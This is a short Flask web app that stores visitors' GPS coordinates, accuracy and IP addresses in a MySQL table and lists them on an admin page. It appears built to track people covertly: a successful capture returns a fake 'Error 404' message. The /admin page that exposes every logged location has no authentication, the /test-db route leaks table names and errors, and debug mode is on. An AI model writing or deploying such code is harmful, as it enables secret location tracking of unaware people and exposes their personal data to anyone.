import os
from flask import Flask, render_template, request, jsonify
from flask_mysqldb import MySQL

app = Flask(__name__)

# ================================
# MySQL Configuration (Railway - PUBLIC for local)
# ================================
app.config['MYSQL_HOST'] = os.environ.get('MYSQLHOST')
app.config['MYSQL_USER'] = os.environ.get('MYSQLUSER')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQLPASSWORD')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DATABASE')
app.config['MYSQL_PORT'] = int(os.environ.get('MYSQLPORT'))

mysql = MySQL(app)

# ================================
# ROUTES
# ================================

@app.route('/')
def home():
    return render_template('index.html')


@app.route('/save_location', methods=['POST'])
def save_location():
    try:
        data = request.get_json()
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        ip = request.remote_addr
        accuracy = data.get('accuracy')

        cursor = mysql.connection.cursor()
        cursor.execute(
            "INSERT INTO emergency_logs (latitude, longitude, ip_address, accuracy) VALUES (%s, %s, %s, %s)",
             (latitude, longitude, ip, accuracy)
        )
        mysql.connection.commit()
        cursor.close()

        return jsonify({"status": "success", "message": "Error 404"})

    except Exception as e:
        print("DB ERROR:", e)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/admin')
def admin():
    cursor = mysql.connection.cursor()
    cursor.execute("SELECT * FROM emergency_logs ORDER BY created_at DESC")
    data = cursor.fetchall()
    cursor.close()
    return render_template('admin.html', data=data)


@app.route('/test-db')
def test_db():
    try:
        cursor = mysql.connection.cursor()
        cursor.execute("SHOW TABLES;")
        tables = cursor.fetchall()
        cursor.close()
        return jsonify({"status": "connected", "tables": tables})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == '__main__':
    app.run(debug=True)
